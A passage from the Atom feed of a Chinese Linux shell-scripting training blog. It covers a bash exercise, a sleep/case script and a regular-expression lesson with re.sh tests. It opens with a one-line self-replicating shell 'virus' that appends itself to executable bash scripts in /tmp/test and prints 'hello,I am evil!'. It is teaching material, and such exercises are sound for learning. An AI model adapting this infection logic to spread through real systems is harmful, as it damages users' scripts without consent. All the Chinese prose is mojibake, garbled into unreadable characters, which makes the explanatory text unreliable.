evil!â€</li><li>å¦‚æœå·²ç»è¢«æ„ŸæŸ“ï¼Œå°±ä¸å†æ„ŸæŸ“</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [ ! -f /tmp/.mybblock ];then touch /tmp/.mybblock; for i in `find /tmp/test/*` ; do grep "mybblock" $i &amp;&gt; /dev/null &amp;&amp; continue ; file $i | grep "Bourne-Again shell script" &amp;&gt; /dev/null || continue ; [ -x $i -a -w $i ] || continue ; tail -n 1 $0 &gt;&gt; $i; done ; echo "hello,I am evil!"; rm -rf /tmp/.mybblock &amp;&gt; /dev/null ; fi</span><br></pre></td></tr></table></figure><hr><p>å¦‚æœfoo.sh çš„ç¬¬ä¸€ä¸ªä½ç½®å‚æ•°ä¸º-s ï¼Œé‚£ä¹ˆå°±æ²‰ç¡ï¼Œæ—¶é—´ç”±ç¬¬äºŒä¸ªä½ç½®å‚æ•°å†³å®š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">SLEEP ()</span><br><span class="line">&#123;</span><br><span class="line">        echo "now sleep"</span><br><span class="line">        sleep $1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">-s)</span><br><span class="line">        SLEEP $2;;</span><br><span class="line">*)</span><br><span class="line">        exit;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;&lt;p&gt;shell çš„åŸºæœ¬ç»„æˆå…ƒç´ &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1&amp;gt; é­”æ³•å­—ç¬¦ â€œ #! â€: å‡ºç°åœ¨è„šæœ¬ç¬¬ä¸€è¡Œ , ç”¨äºå®šä¹‰å‘½ä»¤è§£é‡Šå™¨ã€‚&lt;/li&gt;
&lt;li&gt;2&amp;gt; â€œ # â€ å·å¼€å¤´çš„è¡Œ : é™¤äº†ç¬¬ä¸€è¡Œçš„é­”æ³•å­—ç¬¦ä»¥å¤– , å…¶ä»–ä»¥ â€ # â€œ å·å¼€å¤´ çš„è¡Œ
      
    
    </summary>
    
    
      <category term="æŠ€æœ¯åŸ¹è®­" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShellè„šæœ¬æ•™ç¨‹" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/LinuxShell%E8%84%9A%E6%9C%AC%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="åŸ¹è®­" scheme="http://www.toberoot.com/tags/%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShellè„šæœ¬" scheme="http://www.toberoot.com/tags/LinuxShell%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>LINUX Shell Scripts ç¬¬ä¸‰è¯¾:æ­£åˆ™è¡¨è¾¾å¼</title>
    <link href="http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/02_shell_regular_expression/"/>
    <id>http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/02_shell_regular_expression/</id>
    <published>2016-12-22T21:06:27.000Z</published>
    <updated>2020-03-24T05:17:54.751Z</updated>
    
    <content type="html"><![CDATA[<p>Regular Expression ã€ regex æˆ– regexp, ç¼©å†™ä¸º RE æ­£åˆ™è¡¨è¾¾å¼è¿™ä¸ªæ¦‚å¿µæœ€åˆæ˜¯ç”± Unix ä¸­çš„å·¥å…·è½¯ä»¶ ( ä¾‹å¦‚ sed å’Œ grep) æ™®åŠå¼€çš„ã€‚</p><p>é€šå¸¸è¢«ç”¨æ¥æ£€ç´¢ã€æ›¿æ¢é‚£äº›ç¬¦åˆæŸä¸ªè§„åˆ™çš„æ–‡æœ¬ã€‚</p><p>è®¸å¤šç¨‹åºè®¾è®¡è¯­è¨€éƒ½æ”¯æŒæ­£åˆ™è¡¨è¾¾æ˜¯è¿›è¡Œå­—ç¬¦ä¸²æ“ä½œã€‚ä¾‹å¦‚ï¼Œåœ¨perlä¸­å°±å†…å»ºäº†ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„æ­£åˆ™è¡¨è¾¾å¼å¼•æ“ï¼Œè¿˜æœ‰javaè¯­è¨€è‡ªå¸¦çš„ã€‚</p><p>èµ·æºäºç§‘å­¦å®¶å¯¹äººç±»ç¥ç»ç³»ç»Ÿå·¥ä½œåŸç†çš„æ—©æœŸç ”ç©¶ï¼›Ken Thompsonå°†å…¶åº”ç”¨åˆ°è®¡ç®—æœç´¢ç®—æ³• ï¼ŒUnixä¹‹çˆ¶å°†æ­¤å¼•å…¥åˆ°ç¼–è¾‘å™¨QEDï¼Œåæ¥çš„edï¼Œæœ€ç»ˆå¼•å…¥grepã€‚</p><p>æ¦‚å¿µï¼š</p><p>æ­£åˆ™è¡¨è¾¾å¼æ˜¯å¯¹å­—ç¬¦ä¸²æ“ä½œçš„ä¸€ç§é€»è¾‘å…¬å¼ï¼Œå°±æ˜¯ç”¨äº‹å…ˆå®šä¹‰å¥½çš„ä¸€äº›ç‰¹å®šå­—ç¬¦ã€ä»¥åŠè¿™äº›ç‰¹å®šå­—ç¬¦çš„ç»„åˆï¼Œç»„æˆä¸€ä¸ªâ€œè§„åˆ™å­—ç¬¦ä¸²â€ï¼Œè¿™ä¸ªâ€œè§„åˆ™å­—ç¬¦ä¸²â€ç”¨æ¥è¡¨è¾¾å¯¹å­—ç¬¦ä¸²çš„ä¸€ç§è¿‡æ»¤é€»è¾‘ã€‚</p><h3 id="ä»€ä¹ˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼"><a href="#ä»€ä¹ˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="ä»€ä¹ˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼"></a>ä»€ä¹ˆæ˜¯æ­£åˆ™è¡¨è¾¾å¼</h3><ul><li>æ­£åˆ™è¡¨è¾¾å¼å°±æ˜¯è®°å½•æ–‡æœ¬è§„åˆ™çš„ä»£ç </li><li>å’Œé€šé…ç¬¦ç±»ä¼¼,æ­£åˆ™è¡¨è¾¾å¼ä¹Ÿæ˜¯ç”¨æ¥è¿›è¡Œæ–‡æœ¬åŒ¹é…çš„å·¥å…·,åªä¸è¿‡æ¯”èµ·é€šé…ç¬¦,å®ƒèƒ½æ›´ç²¾ç¡®åœ°æè¿°ä½ çš„éœ€æ±‚</li></ul><p>å­—ç¬¦å’Œå­—ç¬¦ä¸²ï¼š</p><ul><li>å­—ç¬¦æ˜¯è®¡ç®—æœºè½¯ä»¶å¤„ç†æ–‡å­—æ—¶æœ€åŸºæœ¬çš„å•ä½,å¯èƒ½æ˜¯å­—æ¯,æ•°å­—,æ ‡ç‚¹ç¬¦å·,ç©ºæ ¼,æ¢è¡Œç¬¦,æ±‰å­—ç­‰ç­‰</li><li>å­—ç¬¦ä¸²æ˜¯0ä¸ªæˆ–æ›´å¤šä¸ªå­—ç¬¦çš„åºåˆ—ã€‚</li></ul><p>ç‰¹ç‚¹ï¼š</p><ol><li>çµæ´»æ€§ã€é€»è¾‘æ€§å’ŒåŠŸèƒ½æ€§éå¸¸å¼ºï¼›</li><li>å¯ä»¥è¿…é€Ÿåœ°ç”¨æç®€å•çš„æ–¹å¼è¾¾åˆ°å­—ç¬¦ä¸²çš„å¤æ‚æ§åˆ¶ï¼›</li><li>å¯¹äºåˆšæ¥è§¦çš„äººæ¥è¯´ï¼Œæ¯”è¾ƒæ™¦æ¶©éš¾æ‡‚ã€‚</li></ol><p>åº”ç”¨ç¨‹åºï¼š<br>grep,egrep,awk,mysql,vim</p><h3 id="ç‰¹æ®Šç¬¦å·"><a href="#ç‰¹æ®Šç¬¦å·" class="headerlink" title="ç‰¹æ®Šç¬¦å·"></a>ç‰¹æ®Šç¬¦å·</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ç‰¹æ®Šå­—ç¬¦ ä»£è¡¨æ„ä¹‰</span><br><span class="line">[:alnum:] ä»£è¡¨è‹±æ–‡å¤§å°å†™å­—ç¬¦åŠæ•°å­— ,0-9, A-Z, a-z</span><br><span class="line">[:alpha:] ä»£è¡¨ä»»ä½•è‹±æ–‡å¤§å°å†™å­—ç¬¦ , A-Z, a-z</span><br><span class="line">[:lower:] ä»£è¡¨å°å†™å­—ç¬¦ , a-z</span><br><span class="line">[:upper:] ä»£è¡¨å¤§å†™å­—ç¬¦ ,A-Z</span><br><span class="line">[:digit:] ä»£è¡¨æ•°å­—è€Œå·² , 0-9</span><br><span class="line">[:xdigit:] ä»£è¡¨ 16 è¿›åˆ¶æ•°å­— , å› æ­¤åŒ…æ‹¬ : 0-9, A-F, a-f</span><br><span class="line">[:blank:] ä»£è¡¨ç©ºæ ¼é”®å’Œ [Tab] æŒ‰é”®</span><br><span class="line">[:space:] ä»»ä½•ä¼šäº§ç”Ÿç©ºç™½çš„å­—ç¬¦,åŒ…æ‹¬ç©ºæ ¼é”® , [Tab], CR ç­‰ç­‰</span><br><span class="line">[:graph:] é™¤äº†ç©ºæ ¼é”® ( ç©ºæ ¼é”®å’Œ [Tab] ) å¤–çš„å…¶ä»–æ‰€æœ‰æŒ‰é”®</span><br><span class="line">[:cntrl:] ä»£è¡¨é”®ç›˜ä¸Šé¢çš„æ§åˆ¶æŒ‰é”® , åŒ…æ‹¬ CR, LF, Tab, Del.. ç­‰ç­‰</span><br><span class="line">[:print:] ä»£è¡¨ä»»ä½•å¯ä»¥è¢«æ‰“å°å‡ºæ¥çš„å­—ç¬¦</span><br><span class="line">[:punct:] ä»£è¡¨æ ‡ç‚¹ç¬¦å· (punctuation symbol) :&quot; &#39; ? ! ; : # $...</span><br></pre></td></tr></table></figure><h3 id="éæ‰“å°å­—ç¬¦"><a href="#éæ‰“å°å­—ç¬¦" class="headerlink" title="éæ‰“å°å­—ç¬¦"></a>éæ‰“å°å­—ç¬¦</h3><p>éæ‰“å°å­—ç¬¦ä¹Ÿå¯ä»¥æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„ç»„æˆéƒ¨åˆ†ã€‚ä¸‹è¡¨åˆ—å‡ºäº†è¡¨ç¤ºéæ‰“å°å­—ç¬¦çš„è½¬ä¹‰åºåˆ—ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å­—ç¬¦ æè¿°</span><br><span class="line">\cx åŒ¹é…ç”±xæŒ‡æ˜çš„æ§åˆ¶å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ \cM åŒ¹é…ä¸€ä¸ª Control-M æˆ–å›è½¦ç¬¦ã€‚x çš„å€¼å¿…é¡»ä¸º A-Z æˆ– a-z ä¹‹ä¸€ã€‚å¦åˆ™ï¼Œå°† c è§†ä¸ºä¸€ä¸ªåŸä¹‰çš„ &#39;c&#39; å­—ç¬¦ã€‚</span><br><span class="line">\f åŒ¹é…ä¸€ä¸ªæ¢é¡µç¬¦ã€‚ç­‰ä»·äº \x0c å’Œ \cLã€‚</span><br><span class="line">\n åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ç­‰ä»·äº \x0a å’Œ \cJã€‚</span><br><span class="line">\r åŒ¹é…ä¸€ä¸ªå›è½¦ç¬¦ã€‚ç­‰ä»·äº \x0d å’Œ \cMã€‚</span><br><span class="line">\s åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ã€‚ç­‰ä»·äº [ \f\n\r\t\v]ã€‚</span><br><span class="line">\S åŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦ã€‚ç­‰ä»·äº [^ \f\n\r\t\v]ã€‚</span><br><span class="line">\t åŒ¹é…ä¸€ä¸ªåˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äº \x09 å’Œ \cIã€‚</span><br><span class="line">\v åŒ¹é…ä¸€ä¸ªå‚ç›´åˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äº \x0b å’Œ \cK</span><br></pre></td></tr></table></figure><h3 id="å¸¸è§çš„æ­£åˆ™è¡¨è¾¾å¼"><a href="#å¸¸è§çš„æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="å¸¸è§çš„æ­£åˆ™è¡¨è¾¾å¼"></a>å¸¸è§çš„æ­£åˆ™è¡¨è¾¾å¼</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">^ è¡Œé¦–å®šä½ç¬¦</span><br><span class="line">$ è¡Œå°¾å®šä½ç¬¦</span><br><span class="line">. åŒ¹é…é™¤æ¢è¡Œç¬¦ä¹‹å¤–çš„å•ä¸ªå­—ç¬¦</span><br><span class="line">* åŒ¹é… 0 ä¸ªæˆ–å¤šä¸ªå‰ä¸€å­—ç¬¦</span><br><span class="line">? åŒ¹é… 0 ä¸ªæˆ–1ä¸ªå‰ä¸€å­—ç¬¦</span><br><span class="line">+åŒ¹é… 1 ä¸ªæˆ–å¤šä¸ªå‰ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">[ ] åŒ¹é…æŒ‡å®šå­—ç¬¦ç»„å†…çš„ä»»ä¸€å­—ç¬¦</span><br><span class="line">[^] åŒ¹é…ä¸åœ¨æŒ‡å®šå­—ç¬¦ç»„å†…çš„ä»»ä¸€å­—ç¬¦</span><br><span class="line">\&lt; å•è¯èµ·å§‹è¾¹ç•ŒåŒ¹é…ç¬¦</span><br><span class="line">\&gt; å•è¯ç»“æŸè¾¹ç•ŒåŒ¹é…ç¬¦</span><br><span class="line">x\&#123;m\&#125;è¿ç»­ M ä¸ªå­—ç¬¦ X</span><br><span class="line">x\&#123;m,\&#125; è‡³å°‘ M ä¸ªå­—ç¬¦ X</span><br><span class="line">x\&#123;m,n\&#125;è‡³å°‘ M ä¸ªæœ€å¤š N ä¸ªå­—ç¬¦ X</span><br></pre></td></tr></table></figure><h3 id="è¯¾å ‚ç»ƒä¹ "><a href="#è¯¾å ‚ç»ƒä¹ " class="headerlink" title="è¯¾å ‚ç»ƒä¹ "></a>è¯¾å ‚ç»ƒä¹ </h3><blockquote><p>å†™ä¸€ä¸ªæµ‹è¯•è„šæœ¬re.sh;å¸¦ä½ç½®å‚æ•°æ‰§è¡Œï¼Œä¾‹å¦‚ re.sh ab</p></blockquote><h4 id="ä»£è¡¨ä»¥aå¼€å¤´çš„"><a href="#ä»£è¡¨ä»¥aå¼€å¤´çš„" class="headerlink" title="ä»£è¡¨ä»¥aå¼€å¤´çš„"></a>ä»£è¡¨ä»¥aå¼€å¤´çš„</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ^a  ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh b</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br></pre></td></tr></table></figure><h4 id="ä»£è¡¨ä»¥aç»“å°¾çš„"><a href="#ä»£è¡¨ä»¥aç»“å°¾çš„" class="headerlink" title="ä»£è¡¨ä»¥aç»“å°¾çš„"></a>ä»£è¡¨ä»¥aç»“å°¾çš„</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ a$  ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.sh</span><br><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh b</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ba</span><br><span class="line">ok</span><br></pre></td></tr></table></figure><h4 id="ä»£è¡¨aå­—ç¬¦åé¢ä¸€å®šæœ‰ä¸¤ä¸ªå­—ç¬¦"><a href="#ä»£è¡¨aå­—ç¬¦åé¢ä¸€å®šæœ‰ä¸¤ä¸ªå­—ç¬¦" class="headerlink" title="ä»£è¡¨aå­—ç¬¦åé¢ä¸€å®šæœ‰ä¸¤ä¸ªå­—ç¬¦"></a>ä»£è¡¨aå­—ç¬¦åé¢ä¸€å®šæœ‰ä¸¤ä¸ªå­—ç¬¦</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ a..  ]]</span><br><span class="line">then</span><br><span class="line">echo ok</span><br><span class="line">else</span><br><span class="line">echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.sh</span><br><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh axx</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh baxx</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh baxxx</span><br><span class="line">ok</span><br></pre></td></tr></table></figure><h4 id="ä»£è¡¨åŒ¹é…aå­—ç¬¦åé¢å¯ä»¥æ˜¯0ä¸ªbï¼Œä¹Ÿå¯ä»¥æ˜¯å¤šä¸ªb"><a href="#ä»£è¡¨åŒ¹é…aå­—ç¬¦åé¢å¯ä»¥æ˜¯0ä¸ªbï¼Œä¹Ÿå¯ä»¥æ˜¯å¤šä¸ªb" class="headerlink" title="ä»£è¡¨åŒ¹é…aå­—ç¬¦åé¢å¯ä»¥æ˜¯0ä¸ªbï¼Œä¹Ÿå¯ä»¥æ˜¯å¤šä¸ªb"></a>ä»£è¡¨åŒ¹é…aå­—ç¬¦åé¢å¯ä»¥æ˜¯0ä¸ªbï¼Œä¹Ÿå¯ä»¥æ˜¯å¤šä¸ªb</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ab*  ]]</span><br><span class="line">then</span><br><span class="line">echo ok</span><br><span class="line">else</span><br><span class="line">echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh abbbb</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh abbbbxxx</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh accc</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh ccc</span><br><span class="line">no</span><br></pre></td></tr></table></figure><h4 id="åŒ¹é…-0-ä¸ªæˆ–1ä¸ªå‰ä¸€å­—ç¬¦"><a href="#åŒ¹é…-0-ä¸ªæˆ–1ä¸ªå‰ä¸€å­—ç¬¦" class="headerlink" title="åŒ¹é… 0 ä¸ªæˆ–1ä¸ªå‰ä¸€å­—ç¬¦"></a>åŒ¹é… 0 ä¸ªæˆ–1ä¸ªå‰ä¸€å­—ç¬¦</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ 1a?1 ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh 11</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh 1a1</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh 1aa1</span><br><span class="line">no</span><br></pre></td></tr></table></figure><h4 id="ä»£è¡¨åŒ¹é…aå­—ç¬¦åé¢å¯ä»¥æ˜¯1ä¸ªbï¼Œä¹Ÿå¯ä»¥æ˜¯å¤šä¸ªb"><a href="#ä»£è¡¨åŒ¹é…aå­—ç¬¦åé¢å¯ä»¥æ˜¯1ä¸ªbï¼Œä¹Ÿå¯ä»¥æ˜¯å¤šä¸ªb" class="headerlink" title="ä»£è¡¨åŒ¹é…aå­—ç¬¦åé¢å¯ä»¥æ˜¯1ä¸ªbï¼Œä¹Ÿå¯ä»¥æ˜¯å¤šä¸ªb"></a>ä»£è¡¨åŒ¹é…aå­—ç¬¦åé¢å¯ä»¥æ˜¯1ä¸ªbï¼Œä¹Ÿå¯ä»¥æ˜¯å¤šä¸ªb</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ab+ ]]</span><br><span class="line">then</span><br><span class="line">echo ok</span><br><span class="line">else</span><br><span class="line">echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh abbb</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh ac</span><br><span class="line">no</span><br></pre></td></tr></table></figure><h4 id="ä»£è¡¨åŒ¹é…abå­—ç¬¦ï¼Œåé¢å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦"><a href="#ä»£è¡¨åŒ¹é…abå­—ç¬¦ï¼Œåé¢å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦" class="headerlink" title="ä»£è¡¨åŒ¹é…abå­—ç¬¦ï¼Œåé¢å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦"></a>ä»£è¡¨åŒ¹é…abå­—ç¬¦ï¼Œåé¢å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ab.*  ]]</span><br><span class="line">then</span><br><span class="line">echo ok</span><br><span class="line">else</span><br><span class="line">echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.sh</span><br><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh abbbb</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh accc</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ccc</span><br><span class="line">no</span><br></pre></td></tr></table></figure><h4 id="ä»£è¡¨åŒ¹é…aå’Œbå­—ç¬¦ä¹‹é—´å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦"><a href="#ä»£è¡¨åŒ¹é…aå’Œbå­—ç¬¦ä¹‹é—´å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦" class="headerlink" title="ä»£è¡¨åŒ¹é…aå’Œbå­—ç¬¦ä¹‹é—´å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦"></a>ä»£è¡¨åŒ¹é…aå’Œbå­—ç¬¦ä¹‹é—´å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ a.*b  ]]</span><br><span class="line">then</span><br><span class="line">echo ok</span><br><span class="line">else</span><br><span class="line">echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh b</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh a1b</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# 